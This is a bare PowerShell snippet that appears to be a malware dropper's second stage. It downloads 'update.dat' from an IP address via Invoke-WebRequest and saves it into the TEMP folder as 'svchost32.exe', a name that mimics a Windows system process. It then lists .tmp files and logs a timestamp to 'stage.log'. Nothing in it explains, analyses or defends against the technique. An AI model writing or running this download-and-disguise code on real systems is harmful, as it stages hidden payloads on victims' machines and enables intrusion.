$Stage2Url = 'http://198.51.100.63:80/assets/update.dat'
$OutputPath = "$env:TEMP\svchost32.exe"
Invoke-WebRequest -Uri $Stage2Url -OutFile $OutputPath -UseBasicParsing
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
